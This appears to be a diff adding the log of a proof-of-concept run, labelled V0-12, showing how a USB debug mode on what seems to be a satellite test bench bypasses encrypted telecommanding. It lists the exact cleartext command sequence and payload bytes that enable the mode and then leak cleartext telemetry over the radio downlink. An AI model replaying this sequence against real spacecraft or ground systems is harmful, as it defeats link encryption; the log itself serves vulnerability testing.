@@ -1,0 +1,62 @@
+[   0.000] ========================================================================
+[   0.000] V0-12 USB debug backdoor bypasses all crypto
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.857] --> TC apid=0x0A via=usb AES  payload=00
+[   8.898] <-- TM apid=0x0A clear len=3
+[   8.950] --> TC apid=0x1D via=usb clear payload=0101
+[   9.002] <-- TM apid=0x1D clear len=4
+[   9.002] --> TC apid=0x11 via=usb clear payload=00
+[   9.463] <-- TM apid=0x11 clear len=9
+[   9.463] --> TC apid=0x15 via=usb clear payload=001005
+[   9.914] <-- TM apid=0x15 clear len=6
+[   9.914] --> TC apid=0x0D via=usb clear payload=01
+[  10.363] <-- TM apid=0x0D clear len=4
+[  10.415] --> TC apid=0x1D via=usb clear payload=03
+[  10.467] <-- TM apid=0x1D clear len=4
+[  10.467] <-- TM apid=0x09 clear len=9
+[  10.508] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.560] <-- TM apid=0x1D clear len=4
+[  10.560] --> TC apid=0x10 via=usb clear payload=00
+[  10.612] <-- TM apid=0x10 clear len=4
+[  10.612] --> TC apid=0x21 via=usb clear payload=00
+[  11.073] <-- TM apid=0x21 clear len=6
+[  11.073] --> TC apid=0x24 via=usb clear payload=0000
+[  11.114] <-- TM apid=0x24 clear len=8
+[  11.114] --> TC apid=0x24 via=usb clear payload=0100
+[  11.166] <-- TM apid=0x24 clear len=8
+[  11.166] --> TC apid=0x24 via=usb clear payload=0200
+[  11.218] <-- TM apid=0x24 clear len=8
+[  11.218] --> TC apid=0x24 via=usb clear payload=0300
+[  11.269] <-- TM apid=0x24 clear len=8
+[  11.269] --> TC apid=0x25 via=usb clear payload=0080
+[  11.321] <-- TM apid=0x25 clear len=4
+[  11.321] --> TC apid=0x1E via=usb clear payload=01
+[  11.823] <-- TM apid=0x1E clear len=5
+[  11.823] --> TC apid=0x1D via=usb clear payload=0b
+[  11.916] <-- TM apid=0x1D clear len=4
+[  11.916] --> TC apid=0x05 via=usb clear payload=12
+[  12.366] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.879] <-- TM apid=0x1F clear len=4
+[  12.879] --> TC apid=0x1F via=usb clear payload=05
+[  13.381] <-- TM apid=0x1F clear len=4
+[  13.381] --> TC apid=0x0A via=usb clear payload=01
+[  13.436] <-- TM apid=0x0A AES len=3
+[  21.526] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.004] <-- TM apid=0x0E AES len=18
+[  30.004] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.118] --> TC apid=0x10 via=usb AES  payload=01
+[  30.170] <-- TM apid=0x10 clear len=4
+[  30.170] debug status TM: usb_debug=1 secure_flag=1
+[  30.274] --> TC apid=0x0C via=radio clear payload=-
+[  30.834] <-- TM apid=0x09 clear len=17
+[  30.834] --> TC apid=0x0C via=usb clear payload=-
+[  33.688] <-- TM apid=0x0C clear len=27
+[  33.688] clear TM on radio downlink: 0101df1f120a0a0800009403
+[  33.688] --> TC apid=0x10 via=usb clear payload=00
+[  33.740] <-- TM apid=0x10 clear len=4
+[  33.792] bypass off again: usb_debug=False
+[  33.792] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x010 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [INFO] USB debug mode enabled | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=13 FLAGS=1 SEC_HDR=NO | [ERROR] Secure link payload decrypt failed | [TC - SPP] APID=0x00C SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x010 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] USB debug mode disabled | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[  33.792] ========================================================================
+[  33.792] POC OK
+[  33.792] ========================================================================
